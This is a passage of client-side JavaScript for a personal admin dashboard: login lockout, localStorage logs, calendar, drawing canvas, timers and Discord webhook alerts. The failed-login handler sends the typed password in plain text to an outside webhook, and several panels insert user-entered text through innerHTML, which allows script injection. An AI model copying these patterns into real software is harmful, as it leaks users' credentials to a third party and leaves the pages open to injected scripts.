        document.getElementById('dashboard').classList.add('active');
        initializeDashboard();
    }, 3000);
}

async function failedLogin(attemptedUsername, attemptedUserID) {
    attempts--;
    updateAttemptsText(); // Update UI immediately

    document.getElementById('loginBox').classList.add('error-shake');

    setTimeout(() => {
        document.getElementById('loginBox').classList.remove('error-shake');
    }, 500);

    logAdminActivity(`Failed login attempt for user "${attemptedUsername}" (ID: ${attemptedUserID}). Attempts left: ${attempts}.`, "login_failed");

    if (attempts <= 0) {
        const lockMsg = 'No attempts remaining. System locked.';
        errorMsg.textContent = lockMsg;
        disableInputs();
        showResetPopup();
        await logAttemptsExceeded(
            (findUser(attemptedUsername, attemptedUserID) || {}).name,
            attemptedUsername,
            passwordInput.value, // Log password from input for this specific webhook context
            attemptedUserID
        );
    } else {
        errorMsg.textContent = `Invalid credentials. Attempts left: ${attempts}`;
    }
}

function showError(message) {
    errorMsg.textContent = message;
    logError(message); // Log to the new error log panel
    setTimeout(() => {
        errorMsg.textContent = '';
    }, 3000);
}

// Dashboard (Admin Panel) initialization
function initializeDashboard() {
    stats.sessionStartTime = Date.now();

    // Show welcome notification
    document.getElementById('loggedUser').textContent = currentUser;
    document.getElementById('currentUser').textContent = currentUser;
    document.getElementById('currentUserID').textContent = currentUserID;

    document.getElementById('welcomeNotification').style.display = 'block'; // Make sure it's visible initially
    setTimeout(() => {
        document.getElementById('welcomeNotification').style.display = 'none';
    }, 5000);

    // Initialize components
    generateCalendar();
    initializeCanvas();
    startSessionTimer();
    updateClock();
    setInterval(updateClock, 1000);
    updateStats();
    updateAdminLogsDisplay(); // Update the new consolidated log displays
    updateErrorLogDisplay(); // Update error logs display
    updateImportantDatesDisplay(); // Update important dates display
    displayDiscordWebhooks(); // Display webhooks

    logAdminActivity('Admin Panel initialized.', "system_info");
}

function generateCalendar() {
    const calendar = document.getElementById('calendarGrid');
    calendar.innerHTML = '';

    const days = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
    const today = new Date();
    const currentMonth = today.getMonth();
    const currentYear = today.getFullYear();

    // Add day headers
    days.forEach(day => {
        const dayElement = document.createElement('div');
        dayElement.textContent = day;
        dayElement.className = 'calendar-cell text-xs font-bold text-gray-400';
        calendar.appendChild(dayElement);
    });

    // Add calendar days
    const firstDay = new Date(currentYear, currentMonth, 1).getDay();
    const daysInMonth = new Date(currentYear, currentMonth + 1, 0).getDate();

    // Empty cells for days before month starts
    for (let i = 0; i < firstDay; i++) {
        const emptyCell = document.createElement('div');
        emptyCell.className = 'calendar-cell';
        calendar.appendChild(emptyCell);
    }

    // Days of the month
    for (let day = 1; day <= daysInMonth; day++) {
        const dayCell = document.createElement('div');
        dayCell.textContent = day;
        dayCell.className = 'calendar-cell';

        if (day === today.getDate()) {
            dayCell.classList.add('today');
        }

        calendar.appendChild(dayCell);
    }
}

function initializeCanvas() {
    canvas = document.getElementById('drawingCanvas');
    ctx = canvas.getContext('2d');

    canvas.addEventListener('mousedown', startDrawing);
    canvas.addEventListener('mousemove', draw);
    canvas.addEventListener('mouseup', stopDrawing);
    canvas.addEventListener('mouseout', stopDrawing);
}

function startDrawing(e) {
    isDrawing = true;
    const rect = canvas.getBoundingClientRect();
    const x = e.clientX - rect.left;
    const y = e.clientY - rect.top;

    ctx.beginPath();
    ctx.moveTo(x, y);
}

function draw(e) {
    if (!isDrawing) return;

    const rect = canvas.getBoundingClientRect();
    const x = e.clientX - rect.left;
    const y = e.clientY - rect.top;

    ctx.lineWidth = currentThickness;
    ctx.lineCap = 'round';
    ctx.strokeStyle = currentTool === 'eraser' ? 'white' : currentColor;

    ctx.lineTo(x, y);
    ctx.stroke();
    ctx.beginPath();
    ctx.moveTo(x, y);
}

function stopDrawing() {
    isDrawing = false;
    ctx.beginPath();
}

function startSessionTimer() {
    setInterval(() => {
        if (stats.sessionStartTime) {
            const elapsed = Math.floor((Date.now() - stats.sessionStartTime) / 1000);
            const hours = Math.floor(elapsed / 3600);
            const minutes = Math.floor((elapsed % 3600) / 60);
            const seconds = elapsed % 60;

            const timeString = `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;

            const mainSessionTime = document.getElementById('sessionTime');
            if (mainSessionTime) {
                mainSessionTime.textContent = timeString;
            }

            const quickbarSessionTime = document.getElementById('quickbarSessionTime');
            if (quickbarSessionTime) {
                quickbarSessionTime.textContent = timeString;
            }
        }
    }, 1000);
}

// Utility functions
function togglePanel(panelId) {
    const panel = document.getElementById(panelId);
    const isVisible = panel.style.display === 'flex' || panel.style.display === 'block';

    if (panel.classList.contains('settings-modal')) {
        panel.style.display = isVisible ? 'none' : 'flex';
    } else {
        // For grid panels, we toggle 'none' or 'grid' directly
        // Make sure it also shows for new admin panels
        panel.style.display = isVisible ? 'none' : 'block'; 
        // For panels-grid items, 'block' or 'grid' depends on their CSS rules.
        // The panels-grid itself uses 'display: grid', so its children can be 'block' for single item or 'grid' if they also contain a grid.
        // Default to 'block' for simplicity, assuming base CSS handles flex/grid layout within.
    }

    if (!isVisible) {
        stats.panelsOpened++;
        logAdminActivity(`Panel opened: ${panelId}`, "user_action");
    } else {
        stats.panelsClosed++;
        logAdminActivity(`Panel closed: ${panelId}`, "user_action");
    }

    updateStats();
}


function minimizePanel(button) {
    const panel = button.closest('.panel');
    const content = panel.querySelector('.panel-header').nextElementSibling;

    if (content.style.display === 'none') {
        content.style.display = 'block';
        button.innerHTML = '<i class="fas fa-minus"></i>';
    } else {
        content.style.display = 'none';
        button.innerHTML = '<i class="fas fa-plus"></i>';
    }

    stats.buttonPresses++;
    logAdminActivity('Panel minimized/restored', "user_action");
}

function closePanel(button) {
    const panel = button.closest('.panel');
    panel.style.display = 'none';
    stats.panelsClosed++;
    stats.buttonPresses++;
    logAdminActivity(`Panel closed: ${panel.dataset.panel}`, "user_action");
    updateStats();
}

function performSearch() {
    const query = document.getElementById('searchBar').value.toLowerCase();
    if (!query) return;

    stats.searchQueries++;
    logAdminActivity(`Searched for: "${query}"`, "user_action");

    const panels = document.querySelectorAll('.panels-grid > .panel');
    let found = false;
    panels.forEach(panel => {
        const text = panel.textContent.toLowerCase();
        const panelTitle = panel.querySelector('.panel-title').textContent.toLowerCase();

        if (text.includes(query) || panelTitle.includes(query)) {
            panel.style.display = 'block';
            panel.style.border = '2px solid var(--accent-color)';
            found = true;
            setTimeout(() => {
                panel.style.border = '1px solid var(--border-color)';
            }, 2000);
        } else {
            // You might choose to hide non-matching panels or just let them stay
            // panel.style.display = 'none';
        }
    });

    if (!found) {
        showNotification("No matching panels found.");
        logError("Search failed: No matching panels found for query '" + query + "'.");
        logAdminActivity(`Search for "${query}" failed.`, "system_warning");
    }

    updateStats();
}


// --- NEW LOGGING FUNCTIONS FOR ADMIN PANEL ---

function logAdminActivity(message, type = 'user_action', details = {}) {
    const timestamp = new Date().toISOString();
    adminLogs.unshift({
        timestamp,
        user: currentUser,
        userID: currentUserID,
        type, // 'user_action', 'login_success', 'login_failed', 'change_log', 'download_log', 'command_run', 'system_info', 'system_warning'
        message,
        details // Additional JSON details
    });

    if (adminLogs.length > 500) { // Keep last 500 logs
        adminLogs = adminLogs.slice(0, 500);
    }
    saveAdminLogsToStorage();
    updateAdminLogsDisplay(); // Update all relevant displays
}


function updateAdminLogsDisplay() {
    // User Logs (All Activity)
    const userLogsContainer = document.getElementById('userLogsList');
    if (userLogsContainer) {
        userLogsContainer.innerHTML = '';
        adminLogs.slice(0, 50).forEach(log => { // Display latest 50 for performance
            const logElement = document.createElement('div');
            let statusClass = 'info';
            if (log.type === 'login_success') statusClass = 'success';
            else if (log.type === 'login_failed' || log.type === 'system_warning') statusClass = 'failed';
            else if (log.type === 'change_log') statusClass = 'change';
            else if (log.type === 'download_log') statusClass = 'download';
            else if (log.type === 'command_run') statusClass = 'command';

            logElement.className = `log-entry-container ${statusClass}`;
            logElement.innerHTML = `
                <div class="flex-grow">
                    <span class="log-entry-status">${log.type.replace(/_/g, ' ').toUpperCase()}:</span>
                    <span>${log.message}</span>
                </div>
                <span class="log-entry-time">${new Date(log.timestamp).toLocaleTimeString()}</span>
            `;
            userLogsContainer.appendChild(logElement);
        });
    }

    // Change Logs
    const changeLogsContainer = document.getElementById('changeLogsList');
    if (changeLogsContainer) {
        changeLogsContainer.innerHTML = '';
        adminLogs.filter(log => log.type === 'change_log' || log.type === 'system_info' || log.type === 'command_run').slice(0, 20).forEach(log => {
            const logElement = document.createElement('div');
            logElement.className = `log-entry-container change`; // Always use change style for these
            logElement.innerHTML = `
                <div class="flex-grow">
                    <span class="log-entry-status">${log.type.replace(/_/g, ' ').toUpperCase()}:</span>
                    <span>${log.message}</span>
                </div>
                <span class="log-entry-time">${new Date(log.timestamp).toLocaleTimeString()}</span>
            `;
            changeLogsContainer.appendChild(logElement);
        });
    }

    // Download Logs
    const downloadLogsContainer = document.getElementById('downloadLogsList');
    if (downloadLogsContainer) {
        downloadLogsContainer.innerHTML = '';
        adminLogs.filter(log => log.type === 'download_log').slice(0, 20).forEach(log => {
            const logElement = document.createElement('div');
            logElement.className = `log-entry-container download`;
            const screenshotInfo = log.details.screenshot ? `<br><a href="${log.details.screenshot}" target="_blank" class="text-xs text-blue-400 hover:underline">View Screenshot</a>` : '';
            logElement.innerHTML = `
                <div class="flex-grow">
                    <span class="log-entry-status">DOWNLOAD:</span>
                    <span>${log.message}</span>
                    ${screenshotInfo}
                </div>
                <span class="log-entry-time">${new Date(log.timestamp).toLocaleTimeString()}</span>
            `;
            downloadLogsContainer.appendChild(logElement);
        });
    }
}


function logError(message) {
    const timestamp = new Date().toISOString();
    errorLogs.unshift({
        timestamp,
        message,
        id: Date.now()
    });
    logAdminActivity(`System Error: ${message}`, "system_warning"); // Also add to general admin logs

    if (errorLogs.length > 100) { // Keep last 100 errors
        errorLogs = errorLogs.slice(0, 100);
    }
    saveErrorLogsToStorage(); // Persist changes
    updateErrorLogDisplay();
}

function updateErrorLogDisplay() {
    const container = document.getElementById('errorLogsList');
    if (!container) return;
    container.innerHTML = '';

    errorLogs.slice(0, 10).forEach(err => {
        const errorElement = document.createElement('div');
        errorElement.className = 'error-log-entry';
        errorElement.innerHTML = `
            <span>${err.message}</span>
            <span class="error-log-time">${new Date(err.timestamp).toLocaleTimeString()}</span>
        `;
        container.appendChild(errorElement);
    });
}

function clearErrorLogs() {
    if (confirm("Are you sure you want to clear all system error logs?")) {
        errorLogs = [];
        saveErrorLogsToStorage();
        updateErrorLogDisplay();
        showNotification("System error logs cleared.");
        logAdminActivity("System error logs cleared.", "command_run");
    }
}

function downloadErrorLogs() {
    const data = {
        errorLogs: errorLogs,
        timestamp: new Date().toISOString()
    };
    const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `system_error_logs_${new Date().toISOString().split('T')[0]}.json`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);

    showNotification("System error logs downloaded.");
    logAdminActivity("System error logs downloaded.", "command_run");
    stats.buttonPresses++;
    updateStats();
}


// --- Storage and Load Functions for New Admin Logs ---
function saveAdminLogsToStorage() {
    localStorage.setItem('adminLogs', JSON.stringify(adminLogs));
}

function loadAdminLogsFromStorage() {
    const storedLogs = localStorage.getItem('adminLogs');
    if (storedLogs) {
        adminLogs = JSON.parse(storedLogs);
    }
    updateAdminLogsDisplay();
}

function saveImportantDatesToStorage() {
    localStorage.setItem('importantDates', JSON.stringify(importantDates));
}

function loadImportantDatesFromStorage() {
    const storedDates = localStorage.getItem('importantDates');
    if (storedDates) {
        importantDates = JSON.parse(storedDates);
    }
    updateImportantDatesDisplay();
}

// Keeping saveClickCountToStorage and loadClickCountFromStorage for stats panel
function saveClickCountToStorage() {
    localStorage.setItem('mouseClickCount', clickCount);
}

function loadClickCountFromStorage() {
    const storedClickCount = localStorage.getItem('mouseClickCount');
    if (storedClickCount !== null) {
        clickCount = parseInt(storedClickCount);
    }
    // No dedicated panel for this anymore, but it's in stats.
}


function saveErrorLogsToStorage() {
    localStorage.setItem('errorLogs', JSON.stringify(errorLogs));
}

function loadErrorLogsFromStorage() {
    const storedErrorLogs = localStorage.getItem('errorLogs');
    if (storedErrorLogs) {
        errorLogs = JSON.parse(storedErrorLogs);
    }
    updateErrorLogDisplay();
}


function updateImportantDatesDisplay() {
    const container = document.getElementById('importantDatesList');
    if (!container) return;
    container.innerHTML = '';

    importantDates.forEach(dateEntry => {
        const entryElement = document.createElement('div');
        entryElement.className = 'important-date-item';
        const formattedDate = new Date(dateEntry.datetime).toLocaleString();
        entryElement.innerHTML = `
            <div class="date-time">${formattedDate}</div>
            <div class="event-description">${dateEntry.event}</div>
        `;
        container.appendChild(entryElement);
    });
}

// New Important Dates functions
function addImportantDate() {
    const dateInput = document.getElementById('importantDateDay').value;
    const timeInput = document.getElementById('importantDateTime').value;
    const eventInput = document.getElementById('importantDateEvent').value;

    if (dateInput && timeInput && eventInput) {
        const fullDate = `${dateInput}T${timeInput}`; // Format for Date object
        const newDate = {
            id: Date.now(),
            datetime: new Date(fullDate).toISOString(),
            event: eventInput
        };
        importantDates.unshift(newDate); // Add to the beginning
        importantDates.sort((a, b) => new Date(a.datetime) - new Date(b.datetime)); // Keep sorted by date
        saveImportantDatesToStorage();
        updateImportantDatesDisplay();
        logAdminActivity(`Added important date: "${eventInput}" on ${new Date(fullDate).toLocaleString()}`, "user_action");
        showNotification("Important date added!");

        // Clear inputs
        document.getElementById('importantDateDay').value = new Date().toISOString().split('T')[0];
        document.getElementById('importantDateTime').value = "09:00"; // Default to 9 AM
        document.getElementById('importantDateEvent').value = '';
    } else {
        showError("Please fill in all important date fields.");
    }
}

function clearImportantDates() {
    if (confirm("Are you sure you want to clear all important dates?")) {
        importantDates = [];
        saveImportantDatesToStorage();
        updateImportantDatesDisplay();
        logAdminActivity("All important dates cleared.", "command_run");
        showNotification("All important dates cleared.");
    }
}


function updateStats() {
    document.getElementById('buttonPresses').textContent = stats.buttonPresses;
    document.getElementById('toggleSwitches').textContent = stats.toggleSwitches;
    document.getElementById('panelsOpened').textContent = stats.panelsOpened;
    document.getElementById('panelsClosed').textContent = stats.panelsClosed;
    document.getElementById('searchQueries').textContent = stats.searchQueries;
}

function downloadAllLogs() {
    const data = {
        adminLogs,
        errorLogs,
        importantDates,
        stats,
        timestamp: new Date().toISOString(),
        downloadedBy: currentUser,
        downloadedByID: currentUserID
    };

    const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `all_admin_logs_${new Date().toISOString().split('T')[0]}.json`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);

    stats.buttonPresses++;
    logAdminActivity('All admin logs downloaded.', "command_run", { file: a.download });
    showNotification('All admin logs downloaded!');
    updateStats();
}

function downloadChangeLogs() {
    const data = {
        changeLogs: adminLogs.filter(log => log.type === 'change_log'),
        timestamp: new Date().toISOString(),
        downloadedBy: currentUser,
        downloadedByID: currentUserID
    };
    const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `change_logs_${new Date().toISOString().split('T')[0]}.json`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
    logAdminActivity('Change logs downloaded.', "command_run", { file: a.download });
    showNotification('Change logs downloaded!');
}

function downloadDownloadLogs() {
    const data = {
        downloadLogs: adminLogs.filter(log => log.type === 'download_log'),
        timestamp: new Date().toISOString(),
        downloadedBy: currentUser,
        downloadedByID: currentUserID
    };
    const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `download_logs_${new Date().toISOString().split('T')[0]}.json`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
    logAdminActivity('Download logs downloaded.', "command_run", { file: a.download });
    showNotification('Download logs downloaded!');
}

function clearAdminLogs() {
    if (confirm("Are you sure you want to clear ALL admin logs (user actions, changes, downloads, etc.)? This cannot be undone.")) {
        adminLogs = [];
        saveAdminLogsToStorage();
        updateAdminLogsDisplay();
        logAdminActivity("ALL admin logs cleared.", "command_run");
        showNotification("All admin logs cleared!");
    }
}

function clearChangeLogs() {
    if (confirm("Are you sure you want to clear change logs?")) {
        adminLogs = adminLogs.filter(log => log.type !== 'change_log');
        saveAdminLogsToStorage();
        updateAdminLogsDisplay();
        logAdminActivity("Change logs cleared.", "command_run");
        showNotification("Change logs cleared!");
    }
}

function clearDownloadLogs() {
    if (confirm("Are you sure you want to clear download logs?")) {
        adminLogs = adminLogs.filter(log => log.type !== 'download_log');
        saveAdminLogsToStorage();
        updateAdminLogsDisplay();
        logAdminActivity("Download logs cleared.", "command_run");
        showNotification("Download logs cleared!");
    }
}

function showStats() {
    togglePanel('statsPanel');

    // Create stats chart
    const ctx = document.getElementById('statsChart').getContext('2d');
    if (Chart.getChart(ctx)) {
        Chart.getChart(ctx).destroy();
    }
    new Chart(ctx, {
        type: 'doughnut',
        data: {
            labels: ['Button Presses', 'Toggle Switches', 'Panels Opened', 'Panels Closed', 'Search Queries'],
            datasets: [{
                data: [stats.buttonPresses, stats.toggleSwitches, stats.panelsOpened, stats.panelsClosed, stats.searchQueries],
                backgroundColor: ['#ff4500', '#ff6b35', '#00ff41', '#ffaa00', '#0066cc']
            }]
        },
        options: {
            responsive: true,
            maintainAspectRatio: false,
            plugins: {
                legend: {
                    labels: {
                        color: getComputedStyle(document.documentElement).getPropertyValue('--text-primary')
                    }
                }
            }
        }
    });
    logAdminActivity("Statistics panel opened.", "user_action");
}

function displayDiscordWebhooks() {
    const container = document.getElementById('webhooksList');
    if (!container) return;
    container.innerHTML = '';

    for (const key in webhooks) {
        if (webhooks.hasOwnProperty(key)) {
            const url = webhooks[key];
            const webhookElement = document.createElement('div');
            webhookElement.className = 'p-2 bg-gray-800 rounded flex flex-col';
            webhookElement.innerHTML = `
                <span class="font-semibold text-accent-color">${key.replace(/([A-Z])/g, ' $1').trim().toUpperCase()}:</span>
                <span class="text-xs text-gray-400">${url}</span>
            `;
            container.appendChild(webhookElement);
        }
    }
    logAdminActivity("Discord Webhooks panel opened/refreshed.", "user_action");
}


// Timer functions
function startStopwatch() {
    if (!isStopwatchRunning) {
        isStopwatchRunning = true;
        stopwatchInterval = setInterval(() => {
            stopwatchTime++;
            updateStopwatchDisplay();
        }, 10);
        logAdminActivity('Stopwatch started', "user_action");
    }
}

function pauseStopwatch() {
    if (isStopwatchRunning) {
        isStopwatchRunning = false;
        clearInterval(stopwatchInterval);
        logAdminActivity('Stopwatch paused', "user_action");
    }
}

function resetStopwatch() {
    isStopwatchRunning = false;
    clearInterval(stopwatchInterval);
    stopwatchTime = 0;
    updateStopwatchDisplay();
    logAdminActivity('Stopwatch reset', "user_action");
}

function updateStopwatchDisplay() {
    const totalSeconds = Math.floor(stopwatchTime / 100);
    const hours = Math.floor(totalSeconds / 3600);
    const minutes = Math.floor((totalSeconds % 3600) / 60);
    const seconds = totalSeconds % 60;
    const centiseconds = stopwatchTime % 100;

    document.getElementById('stopwatchDisplay').textContent =
        `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}.${centiseconds.toString().padStart(2, '0')}`;
}

function startTimer() {
    const hours = parseInt(document.getElementById('timerHours').value) || 0;
    const minutes = parseInt(document.getElementById('timerMinutes').value) || 0;
    const seconds = parseInt(document.getElementById('timerSeconds').value) || 0;

    timerTime = (hours * 3600) + (minutes * 60) + seconds;

    if (timerTime > 0 && !isTimerRunning) {
        isTimerRunning = true;
        timerInterval = setInterval(() => {
            timerTime--;
            updateTimerDisplay();

            if (timerTime <= 0) {
                pauseTimer();
                showNotification('Timer finished!');
                logAdminActivity('Timer completed', "system_info");
            }
        }, 1000);
        logAdminActivity('Timer started', "user_action");
    }
}

function pauseTimer() {
    isTimerRunning = false;
    clearInterval(timerInterval);
    logAdminActivity('Timer paused', "user_action");
}

function resetTimer() {
    isTimerRunning = false;
    clearInterval(timerInterval);
    timerTime = 0;
    updateTimerDisplay();
    logAdminActivity('Timer reset', "user_action");
}

function updateTimerDisplay() {
    const hours = Math.floor(timerTime / 3600);
    const minutes = Math.floor((timerTime % 3600) / 60);
    const seconds = timerTime % 60;

    document.getElementById('timerDisplay').textContent =
        `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
}

function addReminder() {
    const text = document.getElementById('reminderText').value;
    const time = document.getElementById('reminderTime').value;

    if (text && time) {
        const reminderTime = new Date(time);
        const now = new Date();

        if (reminderTime > now) {
            const timeout = reminderTime.getTime() - now.getTime();

            setTimeout(() => {
                showNotification(`Reminder: ${text}`);
                logAdminActivity(`Reminder triggered: "${text}"`, "system_info");
            }, timeout);

            const reminderElement = document.createElement('div');
            reminderElement.className = 'p-2 bg-gray-700 rounded';
            reminderElement.innerHTML = `
                <div class="font-semibold">${text}</div>
                <div class="text-sm text-gray-400">${reminderTime.toLocaleString()}</div>
            `;

            document.getElementById('remindersList').appendChild(reminderElement);

            document.getElementById('reminderText').value = '';
            document.getElementById('reminderTime').value = '';

            logAdminActivity(`Reminder set: "${text}" for ${reminderTime.toLocaleString()}`, "user_action");
        }
    }
}

// Drawing tools
function selectTool(button, tool) {
    document.querySelectorAll('.tool-btn[data-tool]').forEach(btn => btn.classList.remove('active'));
    button.classList.add('active');
    currentTool = tool;

    const canvas = document.getElementById('drawingCanvas');
    canvas.style.cursor = tool === 'eraser' ? 'crosshair' : 'crosshair';

    logAdminActivity(`Drawing tool changed to: ${tool}`, "user_action");
}

function clearCanvas() {
    ctx.clearRect(0, 0, canvas.width, canvas.height);
    logAdminActivity('Canvas cleared', "user_action");
}

function saveCanvas() {
    const link = document.createElement('a');
    link.download = `drawing_${Date.now()}.png`;
    link.href = canvas.toDataURL();
    link.click();
    logAdminActivity('Canvas saved', "user_action");
}


// Theme functions
function toggleTheme() {
    document.body.classList.toggle('light-theme');
    isLightMode = document.body.classList.contains('light-theme');
    logAdminActivity('Theme toggled to ' + (isLightMode ? 'Light Mode' : 'Dark Mode'), "change_log");
    updateStatsChartTheme();
}

function applyAccentTheme(theme, event) {
    const root = document.documentElement;

    const themes = {
        orange: { primary: '#ff4500', secondary: '#ff6b35' },
        blue: { primary: '#0066cc', secondary: '#004499' },
        green: { primary: '#00cc44', secondary: '#009933' },
        red: { primary: '#cc0044', secondary: '#990033' },
        purple: { primary: '#8800cc', secondary: '#6600aa' },
        amber: { primary: '#ffaa00', secondary: '#ff8800' },
        teal: { primary: '#00aaaa', secondary: '#008888' },
        pink: { primary: '#ff0088', secondary: '#cc0066' }
    };

    if (themes[theme]) {
        root.style.setProperty('--accent-color', themes[theme].primary);
        root.style.setProperty('--accent-secondary', themes[theme].secondary);

        // For light theme, update these too for a new accent for better visibility of success/error etc.
        if (document.body.classList.contains('light-theme')) {
            // These are just example replacements, ideally you'd pick good contrasting colors per accent.
            // For simplicity, reusing the accent color for notification borders/left-borders on specific items.
            root.style.setProperty('--success-color', themes[theme].primary);
            root.style.setProperty('--error-color', themes[theme].primary);
            root.style.setProperty('--warning-color', themes[theme].primary);
        } else {
            // Reset to original dark theme colors if not in light mode for consistency
            root.style.setProperty('--success-color', '#00ff41');
            root.style.setProperty('--error-color', '#ff0040');
            root.style.setProperty('--warning-color', '#ffaa00');
        }


        document.querySelectorAll('.theme-option').forEach(opt => opt.classList.remove('active'));
        event.target.classList.add('active');

        logAdminActivity(`Accent theme changed to: ${theme}`, "change_log");
        updateStatsChartTheme();
    }
}

// Helper to get a contrasting color for notification icons (simplistic example)
function getContrastColor(hexcolor) {
    const r = parseInt(hexcolor.substr(1, 2), 16);
    const g = parseInt(hexcolor.substr(3, 2), 16);
    const b = parseInt(hexcolor.substr(5, 2), 16);
    const y = (r * 299 + g * 587 + b * 114) / 1000;
    return (y >= 128) ? '#000000' : '#FFFFFF'; // returns black or white
}

function updateStatsChartTheme() {
    const chart = Chart.getChart('statsChart');
    if (chart) {
        chart.options.plugins.legend.labels.color = getComputedStyle(document.documentElement).getPropertyValue('--text-primary');
        chart.update();
    }
}


function toggleSetting(toggle, settingName) {
    toggle.classList.toggle('active');
    stats.toggleSwitches++;
    logAdminActivity(`Setting "${settingName}" toggled to ${toggle.classList.contains('active') ? 'ON' : 'OFF'}`, "change_log");
    updateStats();
}

// Refresh functions
function refreshFact() {
    const facts = [
        "Honey never spoils. Archaeologists have found pots of honey in ancient Egyptian tombs that are over 3000 years old and still perfectly edible.",
        "A group of flamingos is called a 'flamboyance'.",
        "Bananas are berries, but strawberries aren't.",
        "The shortest war in history lasted only 38-45 minutes.",
        "A single cloud can weigh more than a million pounds."
    ];

    document.getElementById('randomFact').textContent = facts[Math.floor(Math.random() * facts.length)];
    logAdminActivity('Random fact refreshed', "user_action");
}

function refreshQuote() {
    const quotes = [
        "\"The only way to do great work is to love what you do.\" - Steve Jobs",
        "\"Innovation distinguishes between a leader and a follower.\" - Steve Jobs",
        "\"Life is what happens to you while you're busy making other plans.\" - John Lennon",
        "\"The future belongs to those who believe in the beauty of their dreams.\" - Eleanor Roosevelt",
        "\"It is during our darkest moments that we must focus to see the light.\" - Aristotle"
    ];

    document.getElementById('dailyQuote').textContent = quotes[Math.floor(Math.random() * quotes.length)];
    logAdminActivity('Daily quote refreshed', "user_action");
}

function clearNotifications() {
    document.getElementById('notificationsList').innerHTML = '';
    logAdminActivity('Notifications cleared', "command_run");
}

function saveTextNotes() {
    const notes = document.getElementById('textNotes').value;
    localStorage.setItem('textNotes', notes);
    showNotification('Notes saved successfully');
    logAdminActivity('Text notes saved', "user_action");
}

function clearTextNotes() {
    if (confirm("Are you sure you want to clear your text notes?")) {
        document.getElementById('textNotes').value = '';
        logAdminActivity('Text notes cleared', "user_action");
    }
}

function showNotification(message, type = 'info') {
    const notification = document.createElement('div');
    notification.className = 'notification';
    let icon = '<i class="fas fa-info-circle"></i>';
    if (type === 'success') icon = '<i class="fas fa-check-circle"></i>';
    else if (type === 'error') icon = '<i class="fas fa-exclamation-circle"></i>';
    else if (type === 'warning') icon = '<i class="fas fa-exclamation-triangle"></i>';

    notification.innerHTML = `${icon} ${message}`;
    document.body.appendChild(notification);

    setTimeout(() => {
        notification.remove();
    }, 3000);
}

function logout() {
    if (confirm('Are you sure you want to logout?')) {
        logAdminActivity('System logged out.', "user_action");
        location.reload();
    }
}

// New functions requested by user
function takeScreenshot() {
    html2canvas(document.body).then(function(canvas) {
        const link = document.createElement('a');
        link.download = `screenshot_${Date.now()}.png`;
        link.href = canvas.toDataURL('image/png');
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
        showNotification('Screenshot saved!');
        logAdminActivity('Screenshot taken.', "user_action", { filename: link.download, type: 'png' });
        stats.buttonPresses++;
        updateStats();
    });
}

function togglePanelsGridVisibility() {
    const panelsGrid = document.getElementById('panelsGrid');
    if (panelsGrid.style.display === 'none' || panelsGrid.style.opacity === '0') {
        panelsGrid.style.display = 'grid';
        panelsGrid.style.opacity = '1';
        showNotification('Sections are now visible.');
        logAdminActivity('Panels grid visibility toggled ON.', "user_action");
    } else {
        panelsGrid.style.opacity = '0';
        setTimeout(() => {
            panelsGrid.style.display = 'none';
        }, 300);
        showNotification('Sections are now hidden.');
        logAdminActivity('Panels grid visibility toggled OFF.', "user_action");
    }
    stats.buttonPresses++;
    updateStats();
}

async function restartSystem() {
    if (confirm('Are you sure you want to restart the system? You will be logged out and all unsaved data will be lost.')) {
        logAdminActivity('System restart initiated.', "command_run");
        const embeds = createEmbedsFromFields(
            " System Restart Initiated", 0xFFFF00, [
            { name: "Triggered By", value: currentUser || "Unknown User (pre-login or guest)", inline: true },
            { name: "Location", value: "Admin Panel", inline: true },
            { name: "Time", value: new Date().toLocaleString(), inline: false }
            ]
        );
        await sendWebhook(webhooks.resetInformation, embeds); // Using Reset Information channel for restarts
        localStorage.clear();
        location.reload();
    }
}

// --- NEW ADMIN COMMANDS ---

function confirmAndRunCommand(commandName, ...args) {
    if (confirm(`Are you sure you want to run the command: "${commandName}"? This action cannot be undone for some commands.`)) {
        switch (commandName) {
            case 'clearAllLogs':
                clearAdminLogs();
                clearErrorLogs();
                break;
            case 'wipeLocalStorage':
                localStorage.clear();
                logAdminActivity("ALL local storage data wiped.", "command_run_dangerous");
                showNotification("All local storage data wiped! Restarting...", "warning");
                setTimeout(() => location.reload(), 2000);
                break;
            case 'downloadCurrentState':
                downloadAllLogs(); // Reusing the existing download function
                break;
            default:
                showNotification(`Command "${commandName}" not found or implemented.`, "error");
                logAdminActivity(`Attempted to run unknown command: "${commandName}".`, "command_run_warning");
                break;
        }
        stats.buttonPresses++;
        updateStats();
    } else {
        showNotification(`Command "${commandName}" cancelled.`, "info");
        logAdminActivity(`Command "${commandName}" cancelled.`, "user_action");
    }
}

function simulateUserLogin(success = true) {
    const username = `TestUser_${Date.now().toString().slice(-4)}`;
    const userID = Math.floor(Math.random() * 90000) + 10000;
    const status = success ? 'login_success' : 'login_failed';
    logAdminActivity(`Simulated ${success ? 'successful' : 'failed'} login for user "${username}" (ID: ${userID}).`, status, {
        simulated: true,
        username,
        userID,
        result: success ? 'SUCCESS' : 'FAILED'
    });
    showNotification(`Simulated ${success ? 'successful' : 'failed'} login. Check User Logs.`, success ? 'success' : 'error');
}

function simulateUserAction() {
    const actions = [
        "Accessed settings panel",
        "Viewed calendar",
